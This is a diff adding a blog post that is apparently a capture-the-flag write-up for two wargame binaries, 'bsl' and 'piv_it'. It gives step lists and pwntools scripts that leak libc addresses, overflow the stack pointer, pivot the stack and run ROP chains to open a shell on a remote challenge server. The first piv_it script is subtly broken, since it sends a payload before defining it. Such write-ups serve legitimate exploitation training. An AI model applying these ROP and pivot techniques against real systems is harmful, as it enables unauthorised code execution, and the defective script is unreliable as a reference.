@@ -1,0 +1,247 @@
+---
+title: Nothing Seems Hard Anymore, I've Solved Heap Exploits
+date: "2020-07-24 12:16:11.582772"
+description: "Destroying the stack and getting shells with stack pivots"
+categories: ["code"]
+---
+
+# Nothing Seems Hard Anymore, I've Solved Heap Exploits
+
+## bsl
+
+---
+
+FLAG{REDACTED}
+
+---
+
+_Imagine getting a libc and code address leak for typing something in_
+
+1. Get libc and code address leaks by typing in stuff.
+2. Calculate libc base because you need it later
+3. Overflow one byte into the stack pointer.
+4. Preserve the GOT address in `ebx` by putting in the correct address at `($ebp - 4)` which is the last 4 bytes of the buffer for some reason.
+5. You have now pivoted to somewhere in your big buffer with a 50% chance
+6. (Skip if you know libc version) Use code address to leak another libc address using `puts(puts)`.
+7. Note: the libc version hasn't changed since the last wargame
+8. Make basic rop chain to pop a shell using libc
+9. After aligning by 1 byte, we can use a ret sled to make sure that the rop chain gets executed to pop a shell.
+10. `cat flag`
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+p = remote('plsdonthaq.me', 8001)
+elf = ELF('./bsl')
+
+def getLibcAddress():
+	p.readuntil(': ')
+	return int(p.readuntil('\n', drop=True).decode(), 16)
+
+def sayYes():
+	p.readuntil('/n)')
+	p.sendline('y')
+
+def sayYesQuestion():
+	p.readuntil('?')
+	p.sendline('y')
+
+def prepOverflow():
+	p.readuntil('?\n')
+	p.sendline('0')
+
+def enterFavNum():
+	p.readuntil('?')
+	p.sendline('2')
+
+def getCodeAddress():
+	p.readuntil(': ')
+	return int(p.readuntil('\n', drop=True).decode(), 16)
+
+# Startup
+sayYes()
+
+# Get libc base
+libc = getLibcAddress()
+libc_base = libc - 0x067b40
+
+# I want to know the fav number
+sayYes()
+
+# Here's my fav num
+enterFavNum()
+
+# Yes, I have a number I don't like
+sayYes()
+
+# Get the code address
+codeAddr = getCodeAddress()
+codeBase = codeAddr - elf.symbols['get_number']
+
+# actually chuck 0: a number I don't like lol
+sayYesQuestion()
+
+# One byte overflow into esp
+p.readuntil('?')
+p.sendline(b'B' * 0xcc + p32(codeAddr + 0x28a1))
+
+# Yes I want to know the fav number
+sayYesQuestion()
+sayYesQuestion()
+sayYesQuestion()
+sayYes()
+
+prepOverflow()
+
+# Ret instruction for ret sled
+# for some reason when you use a codeBase, it works 10-20% of the time instead of 50%
+# ret = codeBase + 0x000004a6
+ret = libc_base + 0x00000417
+p.readuntil('!')
+
+# Set ebx
+popEbx = libc_base + 0x00018be5
+binsh = libc_base + 0x0017e0cf
+
+# Set eax
+movEax7 = libc_base + 0x000ad650
+addEax4 = libc_base + 0x0015a90c
+setEax = p32(movEax7) + p32(addEax4)
+
+# Set ecx, edx
+popEcdx = libc_base + 0x0002d54c
+setEcdx = p32(popEcdx) + p32(0) + p32(0)
+
+# int 0x80
+interrupt = p32(libc_base + 0x00002d37)
+
+payload = b''
+payload += p32(popEbx)
+payload += p32(binsh)
+payload += setEax
+payload += setEcdx
+payload += interrupt
+
+# 1 byte alignment
+p.sendline(b'A' + p32(ret) * 0x130 + payload)
+
+p.interactive()
+```
+
+## piv_it
+
+---
+
+FLAG{REDACTED}
+
+---
+
+FLAG{REDACTED}
+
+---
+
+_"I tried to be a stack pivot"_
+
+This one is a bit special as there are two ways to do this one: (Hence the two flags)
+
+1. Standard rop way: you can simply run a system with the `'/bin/sh'` string as an argument
+2. Pivot to the larger buffer and then run your rop
+
+### Common steps:
+
+1. Leak a libc and a code address by literally typing in something.
+2. Calculate the libc version by leaking another address from libc and using the database. Something like `puts(puts)`, which is easy, since we know the address of `puts` in the code. I'm not going to do it here because the libc version hasn't changed since the last wargame
+
+### System /bin/sh
+
+3. Continuing, we overwrite the return address by overflowing the buffer.
+4. Overwrite with the address of `system` calculated using the leaked libc address of `printf`
+5. Continue the rop chain by putting a dummy return address and `'/bin/sh'` string on the stack.
+6. `cat flag`
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+p = remote('plsdonthaq.me', 8002)
+
+p.readuntil('At: ')
+libc_printf = int(p.readline(), 16)
+libc_base = libc_printf - 0x000512d0
+
+p.readuntil('$')
+p.sendline(payload)
+p.readuntil('At: ')
+
+libc_system = libc_base + 0x0003d200
+binsh = libc_base + 0x0017e0cf
+
+p.readuntil('$')
+payload = b'A' * 32 + p32(libc_system) + p32(0) + p32(binsh)
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+### Stack Pivot
+
+3. We overwrite the return address here too, except we want to overwrite using a stack pivot gadget.
+4. On looking for the bigger buffer on the stack, we find that its 0x28c bytes away from esp. So we need to edit esp by at least that amount.
+5. Looking at the pivot gadgets, we see that there's only one rop gadgets that fits the category.
+6. Return to the bigger buffer. Use the same ROP chain from bsl to pop a shell
+7. You don't need to use a ret sled because the pivot is exactly to the start of the big buffer. That `ddd` function is great lol
+8. `cat flag`
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+elf = ELF('./piv_it')
+p = remote('plsdonthaq.me', 8002)
+
+p.readuntil('At: ')
+libc_printf = int(p.readline(), 16)
+
+libc_base = libc_printf - 0x000512d0
+
+p.readuntil('$')
+
+# Basically the same rop as bsl
+popEbx = libc_base + 0x00018be5
+binsh = libc_base + 0x0017e0cf
+movEax7 = libc_base + 0x000ad650
+addEax4 = libc_base + 0x0015a90c
+setEax = p32(movEax7) + p32(addEax4)
+popEcdx = libc_base + 0x0002d54c
+interrupt = p32(libc_base + 0x00002d37)
+
+payload = b''
+payload += p32(popEbx)
+payload += p32(binsh)
+payload += setEax
+payload += p32(popEcdx) + p32(0) + p32(0)
+payload += interrupt
+
+# Put the rop in the bigger buffer
+p.sendline(payload)
+p.readuntil('At: ')
+
+code = int(p.readline(), 16)
+code_base = code - elf.symbols['main']
+
+libc_system = libc_base + 0x0003d200
+binsh = libc_base + 0x0017e0cf
+pivot = 0x00000687 + code_base
+
+# Overwrite the return address with the pivot
+p.readuntil('$')
+payload = cyclic(32).encode() + p32(pivot)
+p.sendline(payload)
+
+p.interactive()
+```
